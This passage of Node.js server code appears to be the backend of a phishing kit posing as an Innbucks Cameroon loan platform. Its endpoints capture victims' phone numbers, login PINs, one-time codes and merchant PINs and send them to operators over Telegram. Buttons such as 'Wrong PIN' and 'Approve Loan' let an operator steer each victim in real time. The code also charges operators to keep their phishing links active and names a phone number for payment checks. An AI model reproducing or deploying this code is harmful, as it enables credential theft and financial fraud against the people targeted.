    console.log('\n🔵 /api/verify-otp called:', JSON.stringify(req.body));
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);

        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        const returningLabel = application.isReturningUser
            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
            : '';

        await sendToAdmin(application.adminId, `
📲 *CODE VERIFICATION*${returningLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔢 \`${otp}\`
⏰ ${new Date().toLocaleString()}

⚠️ *VERIFY CODE*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN',    callback_data: `app-wrongpinotp-${application.adminId}-${applicationId}` }],
                    [{ text: '❌ Wrong Code',   callback_data: `app-wrongcodeotp-${application.adminId}-${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `app-approveotp-${application.adminId}-${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// POST /api/verify-merchant-pin
app.post('/api/verify-merchant-pin', async (req, res) => {
    console.log('\n🔵 /api/verify-merchant-pin called:', JSON.stringify(req.body));
    try {
        const { applicationId, merchantPin } = req.body;

        if (!applicationId || !merchantPin) {
            return res.status(400).json({ success: false, message: 'Missing applicationId or merchantPin' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { merchantPin, merchantPinStatus: 'received' });

        const returningLabel = application.isReturningUser
            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
            : '';

        await sendToAdmin(application.adminId, `
💳 *MERCHANT ACCOUNT PIN*${returningLabel}

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`
🔑 Login PIN: \`${application.pin}\`
🔢 OTP: \`${application.otp}\`
💳 Merchant PIN: \`${merchantPin}\`
⏰ ${new Date().toLocaleString()}

⚠️ *MERCHANT PIN RECEIVED*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong Merchant PIN', callback_data: `app-wrongmerc-${application.adminId}-${applicationId}` }],
                    [{ text: '✅ Confirm & Approve',  callback_data: `app-approvemerc-${application.adminId}-${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-merchant-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-merchant-pin-status/:applicationId
app.get('/api/check-merchant-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.merchantPinStatus || 'pending' });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/resend-otp
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        await sendToAdmin(application.adminId, `
🔄 *OTP RESEND REQUEST*

📋 \`${applicationId}\`
📞 \`${formatPhone(application.phoneNumber)}\`

User requested a new OTP.
        `, { parse_mode: 'Markdown' });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// POST /api/submit-payment
app.post('/api/submit-payment', async (req, res) => {
    try {
        const { adminId, payerName } = req.body;
        if (!adminId || !payerName) return res.status(400).json({ success: false, message: 'Missing adminId or payerName' });

        const admin = await db.getAdmin(adminId);
        if (!admin) return res.status(404).json({ success: false, message: 'Admin not found' });

        await db.updateAdmin(adminId, { paymentStatus: 'pending', payerName, paymentSubmittedAt: new Date() });

        for (const superAdminId of SUPER_ADMINS) {
            await sendToAdmin(superAdminId, `
💰 *NEW PAYMENT SUBMITTED*

🆔 Admin ID: \`${adminId}\`
👤 Name: ${admin.name}
📧 ${admin.email}
💵 Payer: ${payerName}
📅 ${new Date().toLocaleString()}

Verify: 📞 0791336749 (Okeyo Bungu)
            `, {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ APPROVE', callback_data: `paymgmt-approve-${adminId}` },
                        { text: '❌ REJECT',  callback_data: `paymgmt-reject-${adminId}` }
                    ]]
                }
            });
        }

        res.json({ success: true, message: 'Payment submitted. Waiting for super admin approval.' });
    } catch (error) {
        console.error('❌ Error submitting payment:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/admins
app.get('/api/admins', async (req, res) => {
    try {
        const admins    = await db.getActiveAdmins();
        const adminList = admins
            .filter(a => !pausedAdmins.has(a.adminId))
            .map(a => ({ id: a.adminId, name: a.name, email: a.email, status: a.status, connected: adminChatIds.has(a.adminId) }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /api/validate-admin/:adminId
app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const admin = await db.getAdmin(req.params.adminId);
        if (admin && pausedAdmins.has(admin.adminId)) {
            return res.json({ success: true, valid: false, message: 'Admin is currently paused' });
        }
        if (admin && admin.status === 'active' && !admin.linkLocked) {
            res.json({ success: true, valid: true, connected: adminChatIds.has(admin.adminId), admin: { id: admin.adminId, name: admin.name, email: admin.email } });
        } else if (admin && admin.linkLocked) {
            res.json({ success: true, valid: false, message: 'Admin link is locked. Payment required.', locked: true });
        } else {
            res.json({ success: true, valid: false, message: 'Admin not found or inactive' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status:       'ok',
        database:     dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        superAdmins:  SUPER_ADMINS.length,
        autoAssign:   '❌ DISABLED',
        botMode:      'webhook',
        webhookUrl:   `${WEBHOOK_URL}/telegram-webhook`,
        timestamp:    new Date().toISOString()
    });
});

// Serve main HTML
app.get('/', async (req, res) => {
    const adminId = req.query.admin;

    if (adminId) {
        console.log(`🔗 Admin link accessed: ${adminId}`);
        try {
            const admin = await db.getAdmin(adminId);
            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                }
            }
        } catch (error) {
            console.error('Error validating admin on landing page:', error);
        }
    }

    res.sendFile(path.join(__dirname, 'innbucks-integrated.html'));
});

// ==========================================
// START SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n💎 INNBUCKS CAMEROON LOAN PLATFORM`);
    console.log(`==================================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`🔒 Auto-assign: ❌ DISABLED`);
    console.log(`\n✅ Ready!\n`);
});

// ==========================================
// GRACEFUL SHUTDOWN
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}, shutting down...`);
    try {
        for (const [, timer] of adminLinkTimers.entries()) clearTimeout(timer);
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Cleanup complete');
        process.exit(0);
    } catch (error) {
        console.error('❌ Shutdown error:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT',  () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (error) => console.error('❌ Unhandled rejection:', error?.message));
process.on('uncaughtException',  (error) => console.error('❌ Uncaught exception:', error?.message));
